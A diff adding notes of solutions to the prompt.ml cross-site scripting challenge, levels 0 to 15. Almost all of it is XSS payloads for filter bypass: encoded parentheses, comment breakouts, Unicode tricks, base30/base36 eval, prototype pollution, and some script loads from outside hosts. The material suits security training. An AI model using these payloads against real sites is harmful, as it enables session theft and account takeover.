@@ -1,0 +1,133 @@
+https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-0
+
+
+Level 0 -
+ HTML Source - <input type="text" value="hello">
+
+ Solution - "><script>alert(1)</script>
+ 			"><svg/onload=prompt(1)>
+ 			<svg/onload=prompt(1);
+
+Level 1 -
+ HTML Source - <article>test</article>
+
+ Solution - <svg/onload=prompt(1);
+ 			<svg/onload=alert(1);
+
+Level 2  -
+ HTML Source - 
+
+ Solution - <svg><script>alert&#40;1)</script>
+ 			<svg><script>alert&lpar;1)</script>
+ 			<svg><script>prompt&#40;1)</script>
+ 			<svg><script>alert&#x28;1)</script>
+ 			<svg><script>prompt&#40;1)<b>
+ 			<script>prompt.call`${1}`</script>
+ 			<script>eval.call`${'prompt\x281)'}`</script>    use ES6 code
+ 			( - &#40; , &lpar; , &#x28;
+
+ Level 3 -
+ HTML Source - <!-- test -->
+
+ Solution - --!><script>alert(1)</script>
+ 			--!><svg/onload=alert(1)
+ 			--!><svg/onload=prompt(1)
+ 			--!><script>prompt(1)</script>
+
+
+
+ Level 4 -
+ HTML Source - Invalid resource.
+
+ Solution - http://prompt.ml/js/test.js
+
+
+ Level 5 -
+ HTML Source - <input value="test" type="text">
+
+
+ Solution - "type= image src onerror
+ 			= "alert(1)
+
+ 			"type=image src onerror
+			="prompt(1)
+
+ Level 6 -
+ HTML Source - Invalid form data.
+
+ Solution - javascript:prompt(1)#{"action":1}
+ 			javascript:alert(1)#{"action":1}
+ 			vbscript:prompt(1)#{"action":1}
+
+ Level 7 -
+ HTML Source - <p class="comment" title="test"></p>
+
+ Solution - "><svg/a=#"onload='/*#*/alert(1)'
+ 			"><svg/a=#"onload='/*#*/prompt(1)'
+ 			"><svg a=#"onload='`#`;alert(1)'  - using ES6 template literals
+ 			"><script x=#"async=#"src="//⒛₨ -- MSIE specific solution
+
+ Level 8 -
+ HTML Source - <script>                                    
+    				// console.log("test");        
+				</script>
+
+ Solution - [U+2028]prompt(1)[U+2028]-->
+
+
+ Level 9 -
+ HTML Source - <h1>TEST</h1>
+
+ Solution - <ſvg><ſcript/href=//⒕₨>
+ 			<ſcript/ſrc=//⒕₨></ſcript>
+ 			The ſ character, when passed to the toUpperCase() function would be converted to the ASCII character "S" hence solving our problem.
+
+ Level 10 -
+ HTML Source - <script>alert(1)</script>
+
+ Solution - alert(1)
+ 			prompt(1)
+ 			a'lert(1)
+ 			p'rompt(1)
+
+  Level 11 -
+ HTML Source - <script>                                    
+    				var data = {"action":"login","message":"Welcome back, test."};          
+    				if (data.action === "login")            
+        			document.write(data.message)        
+				</script>
+
+ Solution - "(prompt(1))in"
+ 			"(alert(1))in"
+
+
+
+   Level 12 -
+ HTML Source - <script>test</script>
+
+ Solution - eval(630038579..toString(30))(1)   The string prompt is equivalent to 630038579 in Base30:
+
+ 			eval(0x258da033.toString(30))(1)  // Hexadecimal alternative (630038579 == 0x258da033)
+
+ 			eval(1558153217..toString(36))(1)    The string prompt is equivalent to 1558153217 in Base36:
+
+
+   Level 13 -
+ HTML Source - Invalid image data.
+
+ Solution - {"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
+
+
+ Level 14 -
+ HTML Source - <img src="TEST">
+
+ Solution - "><IFRAME/SRC="x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=
+
+ Level 15 -
+ HTML Source - <p class="comment" title="test" data-comment='{"id":0}'></p>
+
+ Solution - "><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
+ 			"><svg><!--#--><script><!--#-->prompt(1)</
+ 			"><svg><!--#--><script><!--#-->alert(1)<!--#--></script>
+
+
